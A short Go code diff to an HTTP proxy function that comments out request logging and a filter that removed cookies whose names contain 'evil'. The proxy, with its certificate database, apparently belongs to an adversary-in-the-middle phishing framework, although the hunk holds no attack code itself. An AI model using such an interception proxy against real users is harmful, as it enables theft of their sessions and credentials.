@@ -639,9 +639,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				log.Info("Request B4 Checkers: %v", req)
+				//log.Info("Request B4 Checkers: %v", req)
 				//Checkers
 				// Define the substring to check for in cookie names
+				/*
 			        substringToCheck := "evil"
 
 			        // Filter out the cookies that contain the substring
@@ -661,6 +662,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			            req.AddCookie(cookie)
 			        }
 				log.Info("Request After Checkers: %v", req)
+				*/
+				
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
 
